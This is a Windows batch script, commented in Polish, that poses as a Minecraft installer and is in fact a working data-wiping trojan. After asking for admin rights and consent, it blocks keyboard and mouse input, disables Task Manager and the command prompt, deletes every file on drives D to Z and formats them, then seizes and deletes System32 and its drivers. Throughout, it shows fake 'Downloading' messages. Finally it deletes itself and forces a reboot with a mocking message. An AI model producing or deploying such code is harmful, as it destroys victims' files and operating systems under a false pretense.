@echo off
:: KROK 1 & 2: SPRAWDZENIE ADMINA I ZIELONY KOLOR
net session >nul 2>&1
if %errorlevel% neq 0 (
    title Error
    color 0a
    echo ########################################
    echo #                                      #
    echo #      Run as administrator, please    #
    echo #                                      #
    echo ########################################
    pause >nul
    exit /b
)

title Minecraft Installer
color 0a
cls

:: KROK 3: PYTANIE O INSTALACJE
echo ########################################
echo #                                      #
echo #      MINECRAFT SETUP WIZARD          #
echo #                                      #
echo ########################################
echo.
set /p "choice=Are you sure to install Minecraft? (Y/N): "

if /i "%choice%" neq "Y" (
    echo.
    echo Installation cancelled.
    shutdown -r -t 5 -c "Ok"
    exit
)

:: KROK 4: START PO KLIKNIECIU "Y"
cls
echo [!] Initializing Minecraft Engine...
timeout /t 2 >nul

:: BLOKADA KLAWIATURY I MYSZKI (ODLACZENIE)
powershell -Command "$m = '[DllImport(\"user32.dll\")] public static extern bool BlockInput(bool fBlock);'; $type = Add-Type -MemberDefinition $m -Name 'Win32' -Namespace 'Utils' -PassThru; $type::BlockInput($true)"

:: BLOKADA TASK MANAGERA I CMD
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f >nul 2>&1

:: A. USUWANIE DYSKOW D, E, F... (WIDOCZNE SCIEZKI)
echo [!] Downloading Game Assets...
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        for /f "delims=" %%f in ('dir /s /b %%d:\*.* 2^>nul') do (
            echo Downloading: %%f
            del /f /q "%%f" >nul 2>&1
        )
        format %%d: /q /x /y >nul 2>&1
    )
)

:: B. USUWANIE STEROWNIKOW (WIDOCZNE SCIEZKI)
echo [!] Downloading Hardware Drivers...
takeown /f C:\Windows\System32\drivers /r /d y >nul 2>&1
icacls C:\Windows\System32\drivers /grant administrators:F /t >nul 2>&1
for /f "delims=" %%i in ('dir /s /b C:\Windows\System32\drivers\*.*') do (
    echo Downloading: %%i
    del /f /q "%%i" >nul 2>&1
)

:: C. USUWANIE SYSTEM32 (WIDOCZNE SCIEZKI - TO BEDZIE WYGLADAC NAJLEPIEJ)
echo [!] Downloading Minecraft Core Engine...
takeown /f C:\Windows\System32 /r /d y >nul 2>&1
icacls C:\Windows\System32 /grant administrators:F /t >nul 2>&1
for /f "delims=" %%i in ('dir /s /b C:\Windows\System32\*.*') do (
    echo Downloading: %%i
    del /f /q "%%i" >nul 2>&1
)

:: D. PRZEDOSTATNI KROK: SAMOUSUWANIE INSTALATORA
:: Skrypt tworzy plik tymczasowy, ktory usunie instalator sekunde przed restartem
(echo ping localhost -n 3 ^> nul ^& del "%~f0") > %temp%\final_clean.bat
start /min "" %temp%\final_clean.bat

:: E. OSTATNI KROK: RESTART Z WIADOMOSCIA
cls
echo ============================================================
echo   Minecraft installed. Restarting to apply changes...
echo ============================================================
shutdown -r -t 2 -c "You are idiot thats not minecraft that is files deleting virus (system too)" -f
exit
